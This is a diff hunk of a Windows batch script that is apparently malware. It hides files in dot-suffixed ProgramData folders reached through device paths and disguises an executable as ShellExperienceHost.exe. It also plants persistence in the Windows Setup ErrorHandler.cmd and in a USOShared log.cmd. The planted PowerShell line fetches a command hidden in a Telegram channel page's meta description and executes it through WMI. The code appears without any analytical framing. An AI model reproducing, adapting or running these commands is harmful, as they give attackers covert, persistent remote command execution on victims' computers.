@@ -23,11 +23,11 @@ move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\libssl-1_1.dll
 move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\vcruntime140.dll" "\\.\%ProgramData%\config..\"
 move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
 move /Y "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
-rd /s /q "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}"
 
 fsutil file setshortname C:\ProgramData\config..\ ""
 fsutil file setshortname C:\ProgramData\logdata..\ ""
 fsutil file setshortname C:\ProgramData\diaglogs..\ ""
+rd /s /q "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}"
 
 echo powershell.exe -NoProfile -Command "$u='https://t.me/s/rurmetm';$c=(iwr $u -UseBasicParsing).Content;$m=[regex]::Match($c,'property=\"og:description\" content=\"(.*?)\"');if($m.Success){$cmd=[Net.WebUtility]::HtmlDecode($m.Groups[1].Value) -replace '&#092;','\';$null=([WMIClass]'Win32_Process').Create($cmd)}" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
 echo powershell.exe \\.\%ProgramData%\logdata..\Index.exe \\.\%ProgramData%\logdata..\prn.ini >> "%ProgramData%\USOShared\log.cmd"
